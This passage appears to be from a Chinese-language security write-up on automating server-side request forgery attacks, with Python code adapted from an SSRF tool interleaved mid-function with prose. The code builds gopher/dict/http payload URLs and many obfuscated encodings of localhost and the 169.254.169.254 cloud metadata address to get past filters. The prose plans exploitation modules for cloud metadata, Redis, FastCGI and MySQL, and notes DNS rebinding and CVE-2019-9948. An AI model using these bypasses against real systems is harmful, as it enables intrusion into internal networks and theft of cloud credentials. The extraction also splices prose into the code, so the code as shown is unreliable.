    return "gopher://{}:{}/_{}".format(ip, port, data)
def wrapper_dict(data, ip, port):
    return "dict://{}:{}/{}".format(ip, port, data)
def wrapper_http(data, ip, port, usernm=False, passwd=False):
    if usernm != False and passwd != False:
        return "http://{}:{}@{}:{}/{}".format(usernm, passwd, ip, port, data)
    return "http://{}:{}/{}".format(ip, port, data)
def wrapper_https(data, ip, port):
    return "https://{}:{}/{}".format(ip, port, data)
def ip_default_local(ips, ip):
    ips.add("127.0.0.1")
    ips.add("0.0.0.0")
    ips.add("localhost")
def ip_default_shortcurt(ips, ip):
    ips.add("[::]")
    ips.add("0000::1")
    ips.add("0")
    ips.add("127.1")
    ips.add("127.0.1")
def ip_default_cidr(ips, ip):
    ips.add("127.0.0.0")
    ips.add("127.0.1.3")
    ips.add("127.42.42.42")
    ips.add("127.127.127.127")
def ip_decimal_notation(ips, ip):
    try:
        packedip = socket.inet_aton(ip)
        ips.add(struct.unpack("!l", packedip)[0])
    except:
        pass
def ip_dotted_decimal_with_overflow(ips, ip):
    try:
        ips.add(".".join([str(int(part) + 256) for part in ip.split(".")]))
    except:
        pass
def ip_dotless_decimal(ips, ip):
    def octet_to_decimal_part(ip_part, octet):
        return int(ip_part) * (256 ** octet)
    try:
        parts = [part for part in ip.split(".")]
        ips.add(str(octet_to_decimal_part(parts[0], 3) + 
octet_to_decimal_part(parts[1], 2) + octet_to_decimal_part(parts[2], 1) + 
octet_to_decimal_part(parts[3], 0)))
    except:
        pass
def ip_dotted_hexadecimal(ips, ip):
    def octet_to_hex_part(number):
            return str(hex(int(number)))
    try:
        ips.add(".".join([octet_to_hex_part(part) for part in ip.split(".")]))
    except:
        pass
def ip_dotted_octal(ips, ip):
    def octet_to_oct_part(number):
            return str(oct(int(number))).replace("o","")
    try:
        ips.add(".".join([octet_to_oct_part(part) for part in ip.split(".")]))
    except:
        pass
def ip_dotless_decimal_with_overflow(ips, ip):
    def octet_to_decimal_part(ip_part, octet):
        return int(ip_part) * (256 ** octet)
    try:
        parts = [part for part in ip.split(".")]
        ips.add(str(octet_to_decimal_part(parts[0], 3) + 
octet_to_decimal_part(parts[1], 2) + octet_to_decimal_part(parts[2], 1) + 
octet_to_decimal_part(parts[3], 0)))
    except:
        pass
def ip_enclosed_alphanumeric(ips, ip):
    intab   = "1234567890abcdefghijklmnopqrstuvwxyz"
    if ip == "127.0.0.1":
        ips.add("ⓛⓞⒸⒶⓛⓣⒺⓢⓣ.ⓜⒺ")
    outtab  = "①②③④⑤⑥⑦⑧⑨⓪ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄ℗ⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ"
    trantab = ip.maketrans(intab, outtab)
    ips.add( ip.translate(trantab) )
    outtab  = "①②③④⑤⑥⑦⑧⑨⓪ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"
    trantab = ip.maketrans(intab, outtab)
    ips.add( ip.translate(trantab) )
def ip_dns_redirect(ips, ip):
    if ip == "127.0.0.1":
        ips.add("localtest.me")
        ips.add("customer1.app.localhost.my.company.127.0.0.1.nip.io")
        ips.add("localtest$google.me")
    if ip == "169.254.169.254":
        ips.add("metadata.nicob.net")
        ips.add("169.254.169.254.xip.io")
        ips.add("1ynrnhl.xip.io")
def gen_ip_list(ip, level):
    ips = set()
    if level == 1:
        ips.add(ip)
    if level == 2:
        ip_default_local(ips, ip)
        ip_default_shortcurt(ips, ip)
⾃动化思考
⾃动化分为⾃动化检测和⾃动化利⽤两个部分，⾃动化检测可以直接使⽤dnslog进⾏，dnslog确定回显后，在测
试dict、gopher、file等协议，这些协议都可以精⼼设置⼀个检测服务器来检测，检测服务器⽤来模拟各种协议，
file协议也可以通过⽹络位置访问。
    if level == 3:
        ip_dns_redirect(ips, ip)
        ip_default_cidr(ips, ip)
    if level == 4:
        ip_decimal_notation(ips, ip)
        ip_enclosed_alphanumeric(ips, ip)
    if level == 5:
        ip_dotted_decimal_with_overflow(ips, ip)
        ip_dotless_decimal(ips, ip)
        ip_dotless_decimal_with_overflow(ips, ip)
        ip_dotted_hexadecimal(ips, ip)
        ip_dotted_octal(ips, ip)
    for ip in ips:
        yield ip 
基于此，就能知道⽬标⽀持的协议类型了。
知道了协议类型，是否回显，接下来就是⾃动化利⽤阶段了。
利⽤模块的编写
ssrfmap使⽤模块化的思想，每个可以ssrf利⽤的组件都作为了⼀个模块。但是它的模块编写⽐较简单，我觉得可
以升级⼀下，根据不同的协议，利⽤⽅式也不⼀样，在插件⾥可以指定⼀下这些参数
1. 指明组件
2. 指明可⽤协议
3. 指明是否回显
可以先把⼀些基础的ssrf 利⽤模块搞定
alibaba
aws
digitalocean
docker
fastcgi
gce
memcache
mysql
⽹段扫描/端⼝扫描
⽂件读取
redis
sendmail
socksproxy
zabbix
这些暂时只有⼀个想法，等把⼯具写出来再完善。
⾃建server验证服务器
⾃由设置30x跳转
探测回显为 python urllib，提示可以使⽤crlf cve
CVE-2019-9948，该漏洞只影响urllib，范围在Python 2.x到2.7.16，可使⽤local-file协议读取⽂件
dns rebinding
当然，上述情况是最理想的情况，在不同的语⾔，不同服务器中也存在差异
1. java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.ttl，默认情况下没有设
置)，失败的默认缓存10s。（缓存时间在 /Library/Java/JavaVirtualMachines/jdk
/Contents/Home/jre/lib/security/java.security 中配置）
2. 在php中则默认没有缓存。
3. Linux默认不会进⾏DNS缓存，mac和windows会缓存(所以复现的时候不要在mac、
windows上尝试)
4. 有些公共DNS服务器，⽐如114.114.114.114还是会把记录进⾏缓存，但是8.8.8.8是严格按
照DNS协议去管理缓存的，如果设置TTL为0，则不会进⾏缓存。
When TLS Hacks You 攻击链⼯具
ftp被动模式
参考
https://security.tencent.com/index.php/blog/msg/179
如何⽤ FTP 被动模式打穿内⽹
https://www.anquanke.com/post/id/254387
Gopherus
https://github.com/tarunkant/Gopherus